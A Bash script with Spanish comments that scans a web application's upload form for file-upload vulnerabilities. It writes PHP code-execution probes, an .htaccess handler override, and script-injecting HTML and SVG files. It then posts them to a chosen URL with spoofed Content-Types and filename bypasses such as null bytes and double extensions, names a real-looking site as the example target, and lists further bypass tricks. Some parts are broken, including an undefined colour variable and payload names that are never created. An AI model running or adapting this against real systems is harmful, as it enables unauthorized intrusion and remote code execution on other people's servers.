#!/bin/bash
# ============================================
# File Upload Scanner v2.0
# Pruebas reales de upload PHP, HTML, SVG
# ============================================

CYAN='\033[0;36m'
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

if [ $# -eq 0 ]; then
    echo -e "${RED}Uso: $0 <url> [upload_endpoint]${NC}"
    echo "Ejemplo: $0 https://sistemataller.com /prueba-gratis"
    exit 1
fi

TARGET_URL="$1"
UPLOAD_ENDPOINT="${2:-/}"
FULL_URL="${TARGET_URL}${UPLOAD_ENDPOINT}"

echo -e "${CYAN}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║           FILE UPLOAD SCANNER v2.0 - PHP/HTML/SVG           ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "${BLUE}Target:${NC} $TARGET_URL"
echo -e "${BLUE}Endpoint:${NC} $UPLOAD_ENDPOINT"
echo ""

TMPDIR=$(mktemp -d)
VULNS_FOUND=0

# ============================================
# FASE 1: CREAR PAYLOADS
# ============================================

echo -e "${YELLOW}[1/6] Creando payloads de prueba...${NC}"
echo ""

# PHP Payloads
cat > "$TMPDIR/shell.php" << 'PHPEOF'
<?php echo "VULN_PHP_".php_uname(); ?>
PHPEOF

cat > "$TMPDIR/shell.php.jpg" << 'PHPEOF'
<?php echo "VULN_PHP_DOUBLE_".php_uname(); ?>
PHPEOF

cat > "$TMPDIR/shell.jpg.php" << 'PHPEOF'
<?php echo "VULN_PHP_REVERSED_".php_uname(); ?>
PHPEOF

cat > "$TMPDIR/shell.phtml" << 'PHPEOF'
<?php echo "VULN_PHTML_".php_uname(); ?>
PHPEOF

cat > "$TMPDIR/shell.php5" << 'PHPEOF'
<?php echo "VULN_PHP5_".php_uname(); ?>
PHPEOF

cat > "$TMPDIR/.htaccess" << 'HTEOF'
AddType application/x-httpd-php .jpg
HTEOF

# HTML Payloads
cat > "$TMPDIR/shell.html" << 'HTMLEOF'
<html><body><script>document.title="XSS_HTML"</script></body></html>
HTMLEOF

cat > "$TMPDIR/shell.htm" << 'HTMLEOF'
<html><body><script>document.title="XSS_HTM"</script></body></html>
HTMLEOF

cat > "$TMPDIR/shell.html.php" << 'HTMLEOF'
<?php echo "VULN_HTML_PHP"; ?>
<html><body><script>document.title="XSS_HTML_PHP"</script></body></html>
HTMLEOF

# SVG Payloads
cat > "$TMPDIR/shell.svg" << 'SVGEOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script>document.title="XSS_SVG"</script>
</svg>
SVGEOF

cat > "$TMPDIR/shell.svg.php" << 'SVGEOF'
<?php echo "VULN_SVG_PHP"; ?>
<svg xmlns="http://www.w3.org/2000/svg"><script>document.title="XSS_SVG_PHP"</script></svg>
SVGEOF

cat > "$TMPDIR/shell.php.svg" << 'SVGEOF'
<?php echo "VULN_PHP_SVG"; ?>
<svg xmlns="http://www.w3.org/2000/svg"><script>document.title="XSS_PHP_SVG"</script></svg>
SVGEOF

# SVG con payload avanzado
cat > "$TMPDIR/shell_advanced.svg" << 'SVGADV'
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="eval(atob('ZG9jdW1lbnQuaXRsZT0iWFNTX0FERkFOQ0VEIik='))">
</svg>
SVGADV

# Bypass payloads
echo '<?php echo "BYPASS_00"; ?>' > "$TMPDIR/bypass00.php%00.jpg"
echo '<?php echo "BYPASS_SPACE"; ?>' > "$TMPDIR/bypass space.php"
echo '<?php echo "BYPASS_TAB"; ?>' > "$TMPDIR/bypass	tab.php"
echo '<?php echo "BYPASS_NULL"; ?>' > "$TMPDIR/bypass%00.php"

echo -e "${GREEN}  ✓ Payloads creados${NC}"

# ============================================
# FASE 2: DETECTAR ENDPOINT DE UPLOAD
# ============================================

echo ""
echo -e "${YELLOW}[2/6] Detectando endpoint de upload...${NC}"
echo ""

# Buscar formularios con input file
UPLOAD_FOUND=0
curl -s "$TARGET_URL" | grep -oP '<form[^>]*>' | while read -r form; do
    if echo "$form" | grep -qi "file\|upload\|logo\|image"; then
        echo -e "${GREEN}  ✓ Formulario encontrado: $form${NC}"
        UPLOAD_FOUND=1
    fi
done

# Buscar input file
curl -s "$TARGET_URL" | grep -oP '<input[^>]*type=["\x27]file["\x27][^>]*>' | while read -r input; do
    echo -e "${GREEN}  ✓ Input file: $input${NC}"
    UPLOAD_FOUND=1
done

# Buscar accept
echo ""
echo -e "${CYAN}Tipos aceptados:${NC}"
curl -s "$TARGET_URL" | grep -oP 'accept=["\x27][^"]*["\x27]' | while read -r line; do
    echo "  $line"
done

# ============================================
# FASE 3: PROBAR PHP UPLOADS
# ============================================

echo ""
echo -e "${YELLOW}[3/6] Probando uploads PHP...${NC}"
echo ""

PHP_PAYLOADS=(
    "shell.php"
    "shell.php.jpg"
    "shell.jpg.php"
    "shell.phtml"
    "shell.php5"
    ".htaccess"
    "shell.php%00.jpg"
    "shell.php "
    "shell.php."
    "shell.php;"
)

for payload in "${PHP_PAYLOADS[@]}"; do
    FILE="$TMPDIR/$payload"
    if [ -f "$FILE" ]; then
        echo -e "${CYAN}  Probando: $payload${NC}"
        
        # Intentar upload con diferentes Content-Types
        for ct in "application/x-php" "image/jpeg" "image/png" "application/octet-stream"; do
            RESP=$(curl -s -o /dev/null -w "%{http_code}" \
                -X POST "$FULL_URL" \
                -F "file=@$FILE;filename=$payload;type=$ct" \
                2>/dev/null)
            
            if [ "$RESP" = "200" ] || [ "$RESP" = "201" ]; then
                echo -e "${RED}    ⚠️ ACEPTADO con Content-Type: $ct (HTTP $RESP)${NC}"
                VULNS_FOUND=$((VULNS_FOUND + 1))
            fi
        done
    fi
done

# ============================================
# FASE 4: PROBAR HTML UPLOADS
# ============================================

echo ""
echo -e "${YELLOW}[4/6] Probando uploads HTML...${NC}"
echo ""

HTML_PAYLOADS=(
    "shell.html"
    "shell.htm"
    "shell.html.php"
    "shell.html%00.php"
    "shell.html "
)

for payload in "${HTML_PAYLOADS[@]}"; do
    FILE="$TMPDIR/$payload"
    if [ -f "$FILE" ]; then
        echo -e "${CYAN}  Probando: $payload${NC}"
        
        for ct in "text/html" "image/svg+xml" "application/octet-stream"; do
            RESP=$(curl -s -o /dev/null -w "%{http_code}" \
                -X POST "$FULL_URL" \
                -F "file=@$FILE;filename=$payload;type=$ct" \
                2>/dev/null)
            
            if [ "$RESP" = "200" ] || [ "$RESP" = "201" ]; then
                echo -e "${RED}    ⚠️ ACEPTADO con Content-Type: $ct (HTTP $RESP)${NC}"
                VULNS_FOUND=$((VULNS_FOUND + 1))
            fi
        done
    fi
done

# ============================================
# FASE 5: PROBAR SVG UPLOADS
# ============================================

echo ""
echo -e "${YELLOW}[5/6] Probando uploads SVG...${NC}"
echo ""

SVG_PAYLOADS=(
    "shell.svg"
    "shell.svg.php"
    "shell.php.svg"
    "shell_advanced.svg"
    "shell.svg%00.php"
)

for payload in "${SVG_PAYLOADS[@]}"; do
    FILE="$TMPDIR/$payload"
    if [ -f "$FILE" ]; then
        echo -e "${CYAN}  Probando: $payload${NC}"
        
        for ct in "image/svg+xml" "text/html" "application/octet-stream"; do
            RESP=$(curl -s -o /dev/null -w "%{http_code}" \
                -X POST "$FULL_URL" \
                -F "file=@$FILE;filename=$payload;type=$ct" \
                2>/dev/null)
            
            if [ "$RESP" = "200" ] || [ "$RESP" = "201" ]; then
                echo -e "${RED}    ⚠️ ACEPTADO con Content-Type: $ct (HTTP $RESP)${NC}"
                VULNS_FOUND=$((VULNS_FOUND + 1))
            fi
        done
    fi
done

# ============================================
# FASE 6: BYPASS AVANZADOS
# ============================================

echo ""
echo -e "${YELLOW}[6/6] Probando bypass avanzados...${NC}"
echo ""

echo -e "${CYAN}  Payloads de bypass:${NC}"
echo ""
echo "    PHP Bypass:"
echo "      shell.php.jpg           - Doble extensión"
echo "      shell.php%00.jpg        - Null byte"
echo "      shell.php%0a.jpg        - Newline"
echo "      shell.php%0d%0a.jpg     - CRLF"
echo "      shell.pHp               - Case mixing"
echo "      shell.php;.jpg          - Semicolon"
echo "      shell.php::$DATA        - NTFS stream"
echo "      shell.php.              - Trailing dot"
echo "      shell.php...            - Multiple dots"
echo ""
echo "    HTML Bypass:"
echo "      shell.html.php          - PHP after HTML"
echo "      shell.htm               - Short extension"
echo "      shell.html%00.php       - Null byte"
echo ""
echo "    SVG Bypass:"
echo "      shell.svg.php           - PHP after SVG"
echo "      shell.php.svg           - SVG after PHP"
echo "      shell.svg%00.php        - Null byte"
echo ""
echo "    Content-Type Bypass:"
echo "      - Enviar PHP con Content-Type: image/png"
echo "      - Enviar HTML con Content-Type: image/jpeg"
echo "      - Enviar SVG con Content-Type: text/plain"
echo ""

# ============================================
# RESUMEN
# ============================================

echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  RESUMEN DE PRUEBAS${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "  Payloads probados: ${CYAN}$(ls $TMPDIR | wc -l)${NC}"
echo -e "  Uploads aceptados: ${RED}$VULNS_FOUND${NC}"
echo ""

if [ $VULNS_FOUND -gt 0 ]; then
    echo -e "${RED}  ⚠️ VULNERABILIDADES ENCONTRADAS${NC}"
    echo ""
    echo "  Acciones recomendadas:"
    echo "    1. Verificar uploads aceptados"
    echo "    2. Probar ejecución de código"
    echo "    3. Verificar si los archivos son accesibles"
    echo "    4. Reportar al equipo de seguridad"
else
    echo -e "${GREEN}  ✓ No se encontraron uploads vulnerables${NC}"
fi

# Limpiar
rm -rf "$TMPDIR"

echo ""
echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
